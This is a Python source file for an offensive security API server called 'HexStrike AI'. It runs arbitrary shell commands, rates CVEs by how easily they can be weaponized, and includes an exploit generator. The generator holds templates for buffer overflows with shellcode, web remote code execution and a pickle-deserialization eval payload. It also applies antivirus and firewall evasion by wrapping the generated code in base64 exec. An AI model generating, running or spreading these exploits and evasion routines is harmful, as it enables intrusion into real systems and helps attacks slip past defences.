#!/usr/bin/env python3
import argparse
import json
import logging
import os
import subprocess
import sys
import traceback
import threading
import time
import hashlib
import pickle
import base64
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
from collections import OrderedDict
import shutil
import venv
import zipfile
from pathlib import Path
from flask import Flask, request, jsonify
import psutil
import signal
import requests

# ============================================================================
# PROCESS MANAGEMENT FOR COMMAND TERMINATION (v5.0 ENHANCEMENT)
# ============================================================================

# Process management for command termination
active_processes = {}  # pid -> process info
process_lock = threading.Lock()

class ProcessManager:
    """Enhanced process manager for command termination and monitoring"""
    
    @staticmethod
    def register_process(pid, command, process_obj):
        """Register a new active process"""
        with process_lock:
            active_processes[pid] = {
                "pid": pid,
                "command": command,
                "process": process_obj,
                "start_time": time.time(),
                "status": "running",
                "progress": 0.0,
                "last_output": "",
                "bytes_processed": 0
            }
            logger.info(f"🆔 REGISTERED: Process {pid} - {command[:50]}...")
    
    @staticmethod
    def update_process_progress(pid, progress, last_output="", bytes_processed=0):
        """Update process progress and stats"""
        with process_lock:
            if pid in active_processes:
                active_processes[pid]["progress"] = progress
                active_processes[pid]["last_output"] = last_output
                active_processes[pid]["bytes_processed"] = bytes_processed
                runtime = time.time() - active_processes[pid]["start_time"]
                
                # Calculate ETA if progress > 0
                eta = 0
                if progress > 0:
                    eta = (runtime / progress) * (1.0 - progress)
                
                active_processes[pid]["runtime"] = runtime
                active_processes[pid]["eta"] = eta
    
    @staticmethod
    def terminate_process(pid):
        """Terminate a specific process"""
        with process_lock:
            if pid in active_processes:
                process_info = active_processes[pid]
                try:
                    process_obj = process_info["process"]
                    if process_obj and process_obj.poll() is None:
                        process_obj.terminate()
                        time.sleep(1)  # Give it a chance to terminate gracefully
                        if process_obj.poll() is None:
                            process_obj.kill()  # Force kill if still running
                        
                        active_processes[pid]["status"] = "terminated"
                        logger.warning(f"🛑 TERMINATED: Process {pid} - {process_info['command'][:50]}...")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error terminating process {pid}: {str(e)}")
                    return False
            return False
    
    @staticmethod
    def cleanup_process(pid):
        """Remove process from active registry"""
        with process_lock:
            if pid in active_processes:
                process_info = active_processes.pop(pid)
                logger.info(f"🧹 CLEANUP: Process {pid} removed from registry")
                return process_info
            return None
    
    @staticmethod
    def get_process_status(pid):
        """Get status of a specific process"""
        with process_lock:
            return active_processes.get(pid, None)
    
    @staticmethod
    def list_active_processes():
        """List all active processes"""
        with process_lock:
            return dict(active_processes)
    
    @staticmethod
    def pause_process(pid):
        """Pause a specific process (SIGSTOP)"""
        with process_lock:
            if pid in active_processes:
                try:
                    process_obj = active_processes[pid]["process"]
                    if process_obj and process_obj.poll() is None:
                        os.kill(pid, signal.SIGSTOP)
                        active_processes[pid]["status"] = "paused"
                        logger.info(f"⏸️  PAUSED: Process {pid}")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error pausing process {pid}: {str(e)}")
            return False
    
    @staticmethod
    def resume_process(pid):
        """Resume a paused process (SIGCONT)"""
        with process_lock:
            if pid in active_processes:
                try:
                    process_obj = active_processes[pid]["process"]
                    if process_obj and process_obj.poll() is None:
                        os.kill(pid, signal.SIGCONT)
                        active_processes[pid]["status"] = "running"
                        logger.info(f"▶️  RESUMED: Process {pid}")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error resuming process {pid}: {str(e)}")
            return False

# HexStrike AI Banner
BANNER = r"""
██╗  ██╗███████╗██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗     █████╗ ██╗
██║  ██║██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝    ██╔══██╗██║
███████║█████╗   ╚███╔╝ ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗      ███████║██║
██╔══██║██╔══╝   ██╔██╗ ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝      ██╔══██║██║
██║  ██║███████╗██╔╝ ██╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗    ██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝

    HexStrike AI - Advanced Cybersecurity Automation Platform
    Developed by: 0x4m4 (www.0x4m4.com) (www.hexstrike.com)
    Version: 5.0.0 Agents
    
    🚀 Powerful AI-driven API Server for offensive security tools
    🛡️  Advanced caching, real-time telemetry, and enhanced logging
    ⚡ Cloud security, file operations, and environment management
    🎯 Process management, CTF tools, and bug bounty arsenal
    
"""

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# Configure enhanced logging with colors
class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors and emojis"""
    
    COLORS = {
        'DEBUG': Colors.CYAN,
        'INFO': Colors.GREEN,
        'WARNING': Colors.YELLOW,
        'ERROR': Colors.RED,
        'CRITICAL': Colors.MAGENTA + Colors.BOLD
    }
    
    EMOJIS = {
        'DEBUG': '🔍',
        'INFO': '✅',
        'WARNING': '⚠️',
        'ERROR': '❌',
        'CRITICAL': '🔥'
    }
    
    def format(self, record):
        emoji = self.EMOJIS.get(record.levelname, '📝')
        color = self.COLORS.get(record.levelname, Colors.WHITE)
        
        # Add color and emoji to the message
        record.msg = f"{color}{emoji} {record.msg}{Colors.RESET}"
        return super().format(record)

# Enhanced logging setup
def setup_logging():
    """Setup enhanced logging with colors and formatting"""
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    
    # Clear existing handlers
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    
    # Console handler with colors
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(ColoredFormatter(
        "[🔥 HexStrike AI] %(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# Configuration
API_PORT = int(os.environ.get("API_PORT", 5000))
DEBUG_MODE = os.environ.get("DEBUG_MODE", "0").lower() in ("1", "true", "yes", "y")
COMMAND_TIMEOUT = 300  # 5 minutes default timeout
CACHE_SIZE = 1000
CACHE_TTL = 3600  # 1 hour

app = Flask(__name__)

class HexStrikeCache:
    """Advanced caching system for command results"""
    
    def __init__(self, max_size: int = CACHE_SIZE, ttl: int = CACHE_TTL):
        self.cache = OrderedDict()
        self.max_size = max_size
        self.ttl = ttl
        self.stats = {"hits": 0, "misses": 0, "evictions": 0}
        
    def _generate_key(self, command: str, params: Dict[str, Any]) -> str:
        """Generate cache key from command and parameters"""
        key_data = f"{command}:{json.dumps(params, sort_keys=True)}"
        return hashlib.md5(key_data.encode()).hexdigest()
    
    def _is_expired(self, timestamp: float) -> bool:
        """Check if cache entry is expired"""
        return time.time() - timestamp > self.ttl
    
    def get(self, command: str, params: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Get cached result if available and not expired"""
        key = self._generate_key(command, params)
        
        if key in self.cache:
            timestamp, data = self.cache[key]
            if not self._is_expired(timestamp):
                # Move to end (most recently used)
                self.cache.move_to_end(key)
                self.stats["hits"] += 1
                logger.info(f"💾 Cache HIT for command: {command}")
                return data
            else:
                # Remove expired entry
                del self.cache[key]
        
        self.stats["misses"] += 1
        logger.info(f"🔍 Cache MISS for command: {command}")
        return None
    
    def set(self, command: str, params: Dict[str, Any], result: Dict[str, Any]):
        """Store result in cache"""
        key = self._generate_key(command, params)
        
        # Remove oldest entries if cache is full
        while len(self.cache) >= self.max_size:
            oldest_key = next(iter(self.cache))
            del self.cache[oldest_key]
            self.stats["evictions"] += 1
        
        self.cache[key] = (time.time(), result)
        logger.info(f"💾 Cached result for command: {command}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get cache statistics"""
        total_requests = self.stats["hits"] + self.stats["misses"]
        hit_rate = (self.stats["hits"] / total_requests * 100) if total_requests > 0 else 0
        
        return {
            "size": len(self.cache),
            "max_size": self.max_size,
            "hit_rate": f"{hit_rate:.1f}%",
            "hits": self.stats["hits"],
            "misses": self.stats["misses"],
            "evictions": self.stats["evictions"]
        }

# Global cache instance
cache = HexStrikeCache()

class TelemetryCollector:
    """Collect and manage system telemetry"""
    
    def __init__(self):
        self.stats = {
            "commands_executed": 0,
            "successful_commands": 0,
            "failed_commands": 0,
            "total_execution_time": 0.0,
            "start_time": time.time()
        }
    
    def record_execution(self, success: bool, execution_time: float):
        """Record command execution statistics"""
        self.stats["commands_executed"] += 1
        if success:
            self.stats["successful_commands"] += 1
        else:
            self.stats["failed_commands"] += 1
        self.stats["total_execution_time"] += execution_time
    
    def get_system_metrics(self) -> Dict[str, Any]:
        """Get current system metrics"""
        return {
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": psutil.disk_usage('/').percent,
            "network_io": psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
        }
    
    def get_stats(self) -> Dict[str, Any]:
        """Get telemetry statistics"""
        uptime = time.time() - self.stats["start_time"]
        success_rate = (self.stats["successful_commands"] / self.stats["commands_executed"] * 100) if self.stats["commands_executed"] > 0 else 0
        avg_execution_time = (self.stats["total_execution_time"] / self.stats["commands_executed"]) if self.stats["commands_executed"] > 0 else 0
        
        return {
            "uptime_seconds": uptime,
            "commands_executed": self.stats["commands_executed"],
            "success_rate": f"{success_rate:.1f}%",
            "average_execution_time": f"{avg_execution_time:.2f}s",
            "system_metrics": self.get_system_metrics()
        }

# Global telemetry collector
telemetry = TelemetryCollector()

class EnhancedCommandExecutor:
    """Enhanced command executor with caching, progress tracking, and better output handling"""
    
    def __init__(self, command: str, timeout: int = COMMAND_TIMEOUT):
        self.command = command
        self.timeout = timeout
        self.process = None
        self.stdout_data = ""
        self.stderr_data = ""
        self.stdout_thread = None
        self.stderr_thread = None
        self.return_code = None
        self.timed_out = False
        self.start_time = None
        self.end_time = None
        
    def _read_stdout(self):
        """Thread function to continuously read and display stdout"""
        try:
            for line in iter(self.process.stdout.readline, ''):
                if line:
                    self.stdout_data += line
                    # Real-time output display
                    logger.info(f"📤 STDOUT: {line.strip()}")
        except Exception as e:
            logger.error(f"Error reading stdout: {e}")
    
    def _read_stderr(self):
        """Thread function to continuously read and display stderr"""
        try:
            for line in iter(self.process.stderr.readline, ''):
                if line:
                    self.stderr_data += line
                    # Real-time error output display
                    logger.warning(f"📥 STDERR: {line.strip()}")
        except Exception as e:
            logger.error(f"Error reading stderr: {e}")
    
    def _show_progress(self, duration: float):
        """Show enhanced progress indication for long-running commands"""
        if duration > 2:  # Show progress for commands taking more than 2 seconds
            progress_chars = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
            start = time.time()
            i = 0
            while self.process and self.process.poll() is None:
                elapsed = time.time() - start
                char = progress_chars[i % len(progress_chars)]
                
                # Calculate progress percentage (rough estimate)
                progress_percent = min((elapsed / self.timeout) * 100, 99.9)
                
                # Create progress bar
                bar_length = 20
                filled_length = int(bar_length * progress_percent / 100)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                # Calculate ETA
                if progress_percent > 5:  # Only show ETA after 5% progress
                    eta = ((elapsed / progress_percent) * 100) - elapsed
                    eta_str = f" | ETA: {eta:.0f}s"
                else:
                    eta_str = " | ETA: Calculating..."
                
                # Update process manager with progress
                ProcessManager.update_process_progress(
                    self.process.pid,
                    progress_percent / 100,
                    f"Running for {elapsed:.1f}s",
                    len(self.stdout_data) + len(self.stderr_data)
                )
                
                logger.info(f"⚡ PROGRESS {char} [{bar}] {progress_percent:.1f}% | {elapsed:.1f}s{eta_str} | PID: {self.process.pid}")
                time.sleep(0.8)
                i += 1
                if elapsed > self.timeout:
                    break
    
    def execute(self) -> Dict[str, Any]:
        """Execute the command with enhanced monitoring and output"""
        self.start_time = time.time()
        
        logger.info(f"🚀 EXECUTING: {self.command}")
        logger.info(f"⏱️  TIMEOUT: {self.timeout}s | PID: Starting...")
        
        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            pid = self.process.pid
            logger.info(f"🆔 PROCESS: PID {pid} started")
            
            # Register process with ProcessManager (v5.0 enhancement)
            ProcessManager.register_process(pid, self.command, self.process)
            
            # Start threads to read output continuously
            self.stdout_thread = threading.Thread(target=self._read_stdout)
            self.stderr_thread = threading.Thread(target=self._read_stderr)
            self.stdout_thread.daemon = True
            self.stderr_thread.daemon = True
            self.stdout_thread.start()
            self.stderr_thread.start()
            
            # Start progress tracking in a separate thread
            progress_thread = threading.Thread(target=self._show_progress, args=(self.timeout,))
            progress_thread.daemon = True
            progress_thread.start()
            
            # Wait for the process to complete or timeout
            try:
                self.return_code = self.process.wait(timeout=self.timeout)
                self.end_time = time.time()
                
                # Process completed, join the threads
                self.stdout_thread.join(timeout=1)
                self.stderr_thread.join(timeout=1)
                
                execution_time = self.end_time - self.start_time
                
                # Cleanup process from registry (v5.0 enhancement)
                ProcessManager.cleanup_process(pid)
                
                if self.return_code == 0:
                    logger.info(f"✅ SUCCESS: Command completed | Exit Code: {self.return_code} | Duration: {execution_time:.2f}s")
                    telemetry.record_execution(True, execution_time)
                else:
                    logger.warning(f"⚠️  WARNING: Command completed with errors | Exit Code: {self.return_code} | Duration: {execution_time:.2f}s")
                    telemetry.record_execution(False, execution_time)
                    
            except subprocess.TimeoutExpired:
                self.end_time = time.time()
                execution_time = self.end_time - self.start_time
                
                # Process timed out but we might have partial results
                self.timed_out = True
                logger.warning(f"⏰ TIMEOUT: Command timed out after {self.timeout}s | Terminating PID {self.process.pid}")
                
                # Try to terminate gracefully first
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # Force kill if it doesn't terminate
                    logger.error(f"🔪 FORCE KILL: Process {self.process.pid} not responding to termination")
                    self.process.kill()
                
                self.return_code = -1
                telemetry.record_execution(False, execution_time)
            
            # Always consider it a success if we have output, even with timeout
            success = True if self.timed_out and (self.stdout_data or self.stderr_data) else (self.return_code == 0)
            
            # Log enhanced final results with summary
            output_size = len(self.stdout_data) + len(self.stderr_data)
            execution_time = self.end_time - self.start_time if self.end_time else 0
            
            # Create status summary
            status_icon = "✅" if success else "❌"
            timeout_status = " [TIMEOUT]" if self.timed_out else ""
            
            logger.info(f"📊 FINAL RESULTS {status_icon}")
            logger.info(f"   ├─ Command: {self.command[:60]}{'...' if len(self.command) > 60 else ''}")
            logger.info(f"   ├─ Duration: {execution_time:.2f}s{timeout_status}")
            logger.info(f"   ├─ Output Size: {output_size} bytes")
            logger.info(f"   ├─ Exit Code: {self.return_code}")
            logger.info(f"   └─ Status: {'SUCCESS' if success else 'FAILED'} | Cached: Yes")
            
            return {
                "stdout": self.stdout_data,
                "stderr": self.stderr_data,
                "return_code": self.return_code,
                "success": success,
                "timed_out": self.timed_out,
                "partial_results": self.timed_out and (self.stdout_data or self.stderr_data),
                "execution_time": self.end_time - self.start_time if self.end_time else 0,
                "timestamp": datetime.now().isoformat()
            }
        
        except Exception as e:
            self.end_time = time.time()
            execution_time = self.end_time - self.start_time if self.start_time else 0
            
            logger.error(f"💥 ERROR: Command execution failed: {str(e)}")
            logger.error(f"🔍 TRACEBACK: {traceback.format_exc()}")
            telemetry.record_execution(False, execution_time)
            
            return {
                "stdout": self.stdout_data,
                "stderr": f"Error executing command: {str(e)}\n{self.stderr_data}",
                "return_code": -1,
                "success": False,
                "timed_out": False,
                "partial_results": bool(self.stdout_data or self.stderr_data),
                "execution_time": execution_time,
                "timestamp": datetime.now().isoformat()
            }

class PythonEnvironmentManager:
    """Manage Python virtual environments and dependencies"""
    
    def __init__(self, base_dir: str = "/tmp/hexstrike_envs"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(exist_ok=True)
    
    def create_venv(self, env_name: str) -> Path:
        """Create a new virtual environment"""
        env_path = self.base_dir / env_name
        if not env_path.exists():
            logger.info(f"🐍 Creating virtual environment: {env_name}")
            venv.create(env_path, with_pip=True)
        return env_path
    
    def install_package(self, env_name: str, package: str) -> bool:
        """Install a package in the specified environment"""
        env_path = self.create_venv(env_name)
        pip_path = env_path / "bin" / "pip"
        
        try:
            result = subprocess.run([str(pip_path), "install", package], 
                                  capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                logger.info(f"📦 Installed package {package} in {env_name}")
                return True
            else:
                logger.error(f"❌ Failed to install {package}: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"💥 Error installing package {package}: {e}")
            return False
    
    def get_python_path(self, env_name: str) -> str:
        """Get Python executable path for environment"""
        env_path = self.create_venv(env_name)
        return str(env_path / "bin" / "python")

# Global environment manager
env_manager = PythonEnvironmentManager()

# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE SYSTEM (v6.0 ENHANCEMENT)
# ============================================================================

class CVEIntelligenceManager:
    """CVE database integration and real-time vulnerability monitoring"""
    
    def __init__(self):
        self.nvd_api_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        self.exploitdb_api_url = "https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv"
        self.github_api_url = "https://api.github.com/search/repositories"
        self.cache_ttl = 3600  # 1 hour cache for CVE data
        
    def fetch_latest_cves(self, hours=24, severity_filter="HIGH,CRITICAL"):
        """Fetch latest CVEs from NVD with filtering"""
        try:
            from datetime import datetime, timedelta
            import requests
            
            # Calculate time range
            end_time = datetime.now()
            start_time = end_time - timedelta(hours=hours)
            
            # Format dates for NVD API
            start_date = start_time.strftime("%Y-%m-%dT%H:%M:%S.000")
            end_date = end_time.strftime("%Y-%m-%dT%H:%M:%S.000")
            
            params = {
                "pubStartDate": start_date,
                "pubEndDate": end_date,
                "resultsPerPage": 100
            }
            
            response = requests.get(self.nvd_api_url, params=params, timeout=30)
            response.raise_for_status()
            
            cve_data = response.json()
            vulnerabilities = cve_data.get("vulnerabilities", [])
            
            # Filter by severity
            severity_levels = [s.strip() for s in severity_filter.split(",")]
            filtered_cves = []
            
            for vuln in vulnerabilities:
                cve_item = vuln.get("cve", {})
                metrics = cve_item.get("metrics", {})
                
                # Extract CVSS score
                cvss_score = 0.0
                severity = "UNKNOWN"
                
                if "cvssMetricV31" in metrics:
                    cvss_data = metrics["cvssMetricV31"][0]["cvssData"]
                    cvss_score = cvss_data.get("baseScore", 0.0)
                    severity = cvss_data.get("baseSeverity", "UNKNOWN")
                elif "cvssMetricV30" in metrics:
                    cvss_data = metrics["cvssMetricV30"][0]["cvssData"]
                    cvss_score = cvss_data.get("baseScore", 0.0)
                    severity = cvss_data.get("baseSeverity", "UNKNOWN")
                
                if severity in severity_levels or "ALL" in severity_levels:
                    filtered_cves.append({
                        "cve_id": cve_item.get("id", ""),
                        "description": cve_item.get("descriptions", [{}])[0].get("value", ""),
                        "cvss_score": cvss_score,
                        "severity": severity,
                        "published_date": cve_item.get("published", ""),
                        "last_modified": cve_item.get("lastModified", ""),
                        "references": [ref.get("url", "") for ref in cve_item.get("references", [])]
                    })
            
            return {
                "success": True,
                "total_cves": len(filtered_cves),
                "cves": filtered_cves,
                "timeframe": f"{hours} hours",
                "severity_filter": severity_filter
            }
            
        except Exception as e:
            logger.error(f"Error fetching CVEs: {str(e)}")
            return {
                "success": False,
                "error": str(e),
                "cves": []
            }
    
    def analyze_cve_exploitability(self, cve_id):
        """AI-powered analysis of CVE exploitability"""
        try:
            # Fetch CVE details
            cve_url = f"{self.nvd_api_url}?cveId={cve_id}"
            response = requests.get(cve_url, timeout=30)
            response.raise_for_status()
            
            cve_data = response.json()
            if not cve_data.get("vulnerabilities"):
                return {"success": False, "error": "CVE not found"}
            
            vuln = cve_data["vulnerabilities"][0]["cve"]
            
            # Analyze exploitability factors
            exploitability_score = 0
            factors = []
            
            # Check for remote exploitation
            descriptions = vuln.get("descriptions", [])
            desc_text = " ".join([d.get("value", "") for d in descriptions]).lower()
            
            if any(keyword in desc_text for keyword in ["remote", "network", "unauthenticated"]):
                exploitability_score += 30
                factors.append("Remote exploitation possible")
            
            if any(keyword in desc_text for keyword in ["code execution", "rce", "arbitrary code"]):
                exploitability_score += 40
                factors.append("Code execution vulnerability")
            
            if any(keyword in desc_text for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
                exploitability_score += 25
                factors.append("Memory corruption vulnerability")
            
            if any(keyword in desc_text for keyword in ["injection", "sql", "command", "script"]):
                exploitability_score += 35
                factors.append("Injection vulnerability")
            
            # Check CVSS metrics for exploitability
            metrics = vuln.get("metrics", {})
            if "cvssMetricV31" in metrics:
                cvss = metrics["cvssMetricV31"][0]["cvssData"]
                if cvss.get("attackVector") == "NETWORK":
                    exploitability_score += 20
                    factors.append("Network attack vector")
                if cvss.get("attackComplexity") == "LOW":
                    exploitability_score += 15
                    factors.append("Low attack complexity")
                if cvss.get("privilegesRequired") == "NONE":
                    exploitability_score += 25
                    factors.append("No privileges required")
            
            # Determine exploitability level
            if exploitability_score >= 80:
                level = "CRITICAL"
            elif exploitability_score >= 60:
                level = "HIGH"
            elif exploitability_score >= 40:
                level = "MEDIUM"
            else:
                level = "LOW"
            
            return {
                "success": True,
                "cve_id": cve_id,
                "exploitability_score": exploitability_score,
                "exploitability_level": level,
                "factors": factors,
                "recommendation": self._get_exploit_recommendation(level, factors)
            }
            
        except Exception as e:
            logger.error(f"Error analyzing CVE {cve_id}: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _get_exploit_recommendation(self, level, factors):
        """Get exploitation recommendation based on analysis"""
        if level == "CRITICAL":
            return "Immediate exploitation possible - High priority for red team testing"
        elif level == "HIGH":
            return "Likely exploitable - Good candidate for weaponization"
        elif level == "MEDIUM":
            return "Potentially exploitable - Requires further analysis"
        else:
            return "Low exploitation probability - Consider for information gathering"
    
    def search_existing_exploits(self, cve_id):
        """Search for existing exploits across multiple sources"""
        try:
            results = {
                "cve_id": cve_id,
                "exploits_found": [],
                "sources_checked": ["exploit-db", "github", "metasploit"]
            }
            
            # Search GitHub for PoCs
            try:
                github_params = {
                    "q": f"{cve_id} exploit proof concept poc",
                    "type": "repositories",
                    "sort": "updated"
                }
                
                github_response = requests.get(self.github_api_url, params=github_params, timeout=15)
                if github_response.status_code == 200:
                    github_data = github_response.json()
                    
                    for repo in github_data.get("items", [])[:5]:  # Limit to top 5
                        results["exploits_found"].append({
                            "source": "github",
                            "title": repo.get("name", ""),
                            "url": repo.get("html_url", ""),
                            "description": repo.get("description", ""),
                            "stars": repo.get("stargazers_count", 0),
                            "last_updated": repo.get("updated_at", "")
                        })
            except Exception as e:
                logger.warning(f"GitHub search failed: {str(e)}")
            
            # Check local exploit database files (if available)
            exploit_keywords = [cve_id.lower(), cve_id.replace("-", "")]
            local_exploits = self._search_local_exploits(exploit_keywords)
            results["exploits_found"].extend(local_exploits)
            
            return {
                "success": True,
                "results": results,
                "total_exploits": len(results["exploits_found"])
            }
            
        except Exception as e:
            logger.error(f"Error searching exploits for {cve_id}: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _search_local_exploits(self, keywords):
        """Search local exploit database"""
        # This would search local copies of exploit databases
        # For now, return empty list - can be enhanced with local DB integration
        return []

class AIExploitGenerator:
    """AI-powered exploit development and enhancement system"""
    
    def __init__(self):
        # Extend existing payload templates
        self.exploit_templates = {
            "buffer_overflow": {
                "x86": """
# Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x86

import struct
import socket

def create_exploit():
    # Vulnerability details from {cve_id}
    target_ip = "{target_ip}"
    target_port = {target_port}
    
    # Buffer overflow payload
    padding = "A" * {offset}
    eip_control = struct.pack("<I", {ret_address})
    nop_sled = "\\x90" * {nop_size}
    
    # Shellcode ({shellcode_type})
    shellcode = {shellcode}
    
    exploit = padding + eip_control + nop_sled + shellcode
    return exploit

if __name__ == "__main__":
    payload = create_exploit()
    print(f"Exploit payload generated for {cve_id}")
    print(f"Payload size: {{len(payload)}} bytes")
                """,
                "x64": """
# 64-bit Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x64

import struct
import socket

def create_exploit():
    target_ip = "{target_ip}"
    target_port = {target_port}
    
    # ROP chain for x64 exploitation
    padding = "A" * {offset}
    rop_chain = [
        {rop_gadgets}
    ]
    
    rop_payload = "".join([struct.pack("<Q", addr) for addr in rop_chain])
    shellcode = {shellcode}
    
    exploit = padding + rop_payload + shellcode
    return exploit
                """
            },
            "web_rce": """
# Web-based RCE Exploit for {cve_id}
# Target: {target_info}

import requests
import sys

def exploit_rce(target_url, command):
    # CVE {cve_id} exploitation
    headers = {{
        "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
        "Content-Type": "{content_type}"
    }}
    
    # Injection payload
    payload = {injection_payload}
    
    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"Exploit failed: {{e}}")
    
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_url> <command>")
        sys.exit(1)
    
    result = exploit_rce(sys.argv[1], sys.argv[2])
    if result:
        print("Exploit successful!")
        print(result)
            """,
            "deserialization": """
# Deserialization Exploit for {cve_id}
# Target: {target_info}

import pickle
import base64
import requests

class ExploitPayload:
    def __reduce__(self):
        return (eval, ('{command}',))

def create_malicious_payload(command):
    payload = ExploitPayload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()
    return encoded

def send_exploit(target_url, command):
    payload = create_malicious_payload(command)
    
    data = {{
        "{parameter_name}": payload
    }}
    
    response = requests.post(target_url, data=data)
    return response.text
            """
        }
        
        self.evasion_techniques = {
            "encoding": ["url", "base64", "hex", "unicode"],
            "obfuscation": ["variable_renaming", "string_splitting", "comment_injection"],
            "av_evasion": ["encryption", "packing", "metamorphism"],
            "waf_bypass": ["case_variation", "parameter_pollution", "header_manipulation"]
        }
    
    def generate_exploit_from_cve(self, cve_data, target_info):
        """Generate working exploit from CVE data"""
        try:
            cve_id = cve_data.get("cve_id", "")
            description = cve_data.get("description", "").lower()
            
            # Determine vulnerability type
            vuln_type = self._classify_vulnerability(description)
            exploit_template = self._select_template(vuln_type, target_info)
            
            # Generate exploit parameters
            exploit_params = self._generate_exploit_parameters(cve_data, target_info, vuln_type)
            
            # Fill template with parameters
            exploit_code = exploit_template.format(**exploit_params)
            
            # Apply evasion techniques if requested
            if target_info.get("evasion_level", "none") != "none":
                exploit_code = self._apply_evasion_techniques(exploit_code, target_info)
            
            return {
                "success": True,
                "cve_id": cve_id,
                "vulnerability_type": vuln_type,
                "exploit_code": exploit_code,
                "parameters": exploit_params,
                "instructions": self._generate_usage_instructions(vuln_type, exploit_params),
                "evasion_applied": target_info.get("evasion_level", "none")
            }
            
        except Exception as e:
            logger.error(f"Error generating exploit: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _classify_vulnerability(self, description):
        """Classify vulnerability type from description"""
        if any(keyword in description for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
            return "buffer_overflow"
        elif any(keyword in description for keyword in ["code execution", "command injection", "rce"]):
            return "web_rce"
        elif any(keyword in description for keyword in ["deserialization", "unserialize", "pickle"]):
            return "deserialization"
        elif any(keyword in description for keyword in ["sql injection", "sqli"]):
            return "sql_injection"
        elif any(keyword in description for keyword in ["xss", "cross-site scripting"]):
            return "xss"
        else:
            return "generic"
    
    def _select_template(self, vuln_type, target_info):
        """Select appropriate exploit template"""
        if vuln_type == "buffer_overflow":
            arch = target_info.get("target_arch", "x86")
            return self.exploit_templates["buffer_overflow"].get(arch,
                   self.exploit_templates["buffer_overflow"]["x86"])
        elif vuln_type in self.exploit_templates:
            return self.exploit_templates[vuln_type]
        else:
            return "# Generic exploit template for {cve_id}\n# Manual development required"
    
    def _generate_exploit_parameters(self, cve_data, target_info, vuln_type):
        """Generate parameters for exploit template"""
        params = {
            "cve_id": cve_data.get("cve_id", ""),
            "target_info": target_info.get("description", "Unknown target"),
            "target_ip": target_info.get("target_ip", "192.168.1.100"),
            "target_port": target_info.get("target_port", 80),
            "command": target_info.get("command", "id"),
        }
        
        if vuln_type == "buffer_overflow":
            params.update({
                "offset": target_info.get("offset", 268),
                "ret_address": target_info.get("ret_address", "0x41414141"),
                "nop_size": target_info.get("nop_size", 16),
                "shellcode": target_info.get("shellcode", '"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"'),
                "shellcode_type": target_info.get("shellcode_type", "linux/x86/exec"),
                "rop_gadgets": target_info.get("rop_gadgets", "0x41414141, 0x42424242")
            })
        elif vuln_type == "web_rce":
            params.update({
                "content_type": target_info.get("content_type", "application/x-www-form-urlencoded"),
                "injection_payload": target_info.get("injection_payload", '{"cmd": command}'),
                "parameter_name": target_info.get("parameter_name", "data")
            })
        
        return params
    
    def _apply_evasion_techniques(self, exploit_code, target_info):
        """Apply evasion techniques to exploit code"""
        evasion_level = target_info.get("evasion_level", "basic")
        
        if evasion_level == "basic":
            # Simple string obfuscation
            exploit_code = exploit_code.replace('"', "'")
            exploit_code = f"# Obfuscated exploit\n{exploit_code}"
        elif evasion_level == "advanced":
            # Advanced obfuscation
            exploit_code = self._advanced_obfuscation(exploit_code)
        
        return exploit_code
    
    def _advanced_obfuscation(self, code):
        """Apply advanced obfuscation techniques"""
        # This is a simplified version - real implementation would be more sophisticated
        obfuscated = f"""
# Advanced evasion techniques applied
import base64
exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
        """
        return obfuscated
    
